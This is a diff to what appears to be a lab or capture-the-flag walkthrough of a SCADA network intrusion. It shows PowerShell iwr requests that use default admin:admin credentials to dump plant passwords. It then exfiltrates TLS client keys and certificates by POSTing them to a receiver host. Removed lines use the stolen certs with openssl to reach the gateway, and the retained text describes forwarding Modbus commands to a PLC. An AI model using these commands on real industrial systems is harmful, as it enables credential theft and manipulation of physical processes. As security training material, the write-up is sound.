@@ -18,7 +18,7 @@ The `Authorization` header is `admin:admin` base64-encoded. The dashboard
 returns live plant state polled from the historian.
 
 ```powershell
-curl -u admin:admin http://10.10.2.20:8080/config
+iwr -Uri http://10.10.2.20:8080/config -Headers @{Authorization="Basic YWRtaW46YWRtaW4="}
 ```
 
 The `/config` endpoint returns a plaintext credential dump: historian read
@@ -27,13 +27,13 @@ and the web credentials themselves. Added during commissioning for the monitorin
 integration and never removed.
 
 ```powershell
-curl -u admin:admin http://10.10.2.20:8080/historian-pass
+iwr -Uri http://10.10.2.20:8080/historian-pass -Headers @{Authorization="Basic YWRtaW46YWRtaW4="}
 ```
 
 Proxies a historian `/report` query. Added by an engineer who kept forgetting
 the historian password. Also never removed.
 
-A bare `curl -I http://10.10.2.20:8080/` without credentials returns a 401 with
+An unauthenticated request to `http://10.10.2.20:8080/` returns a 401 with
 `X-Powered-By: UU-SCADA/2.1 Flask/2.3 Python/3.11` on every response. Version
 disclosure before authentication.
 
@@ -171,26 +171,18 @@ cat C:\SCADA\Config\certs\client.crt
 cat C:\SCADA\Config\certs\ca.crt
 ```
 
-PEM blocks. Exfiltrate them to the attacker machine via `iwr`:
+PEM blocks. The operational zone has no direct route to unseen-gate; exfil via
+wizzards-retreat (10.10.2.3), which is on the same subnet. Start the receiver there
+first, then send:
 
 ```powershell
-iwr -Method POST -Uri http://10.10.0.5:9999/key -InFile C:\SCADA\Config\certs\client.key
-iwr -Method POST -Uri http://10.10.0.5:9999/crt -InFile C:\SCADA\Config\certs\client.crt
-iwr -Method POST -Uri http://10.10.0.5:9999/ca  -InFile C:\SCADA\Config\certs\ca.crt
+iwr -Method POST -Uri http://10.10.2.3:9999/client.key -InFile C:\SCADA\Config\certs\client.key
+iwr -Method POST -Uri http://10.10.2.3:9999/client.crt -InFile C:\SCADA\Config\certs\client.crt
+iwr -Method POST -Uri http://10.10.2.3:9999/ca.crt     -InFile C:\SCADA\Config\certs\ca.crt
 ```
 
-Set up a listener on the attacker machine before sending. With all three files
-saved there, connect directly to the gateway, bypassing the SCADA application:
-
-From attacker machine:
-
-```
-openssl s_client -connect 10.10.2.50:8502 \
-    -tls1_2 -cipher 'DEFAULT@SECLEVEL=0' \
-    -cert /tmp/client.crt \
-    -key  /tmp/client.key \
-    -CAfile /tmp/ca.crt
-```
+Receiver setup, pull to unseen-gate, and using the certs against the gateway:
+`books2/scada-cert-exfil.md`.
 
 With an authenticated TLS session open, forward Modbus commands to the PLC via
 socat or a Python script. The gateway verifies the client cert; the PLC sees
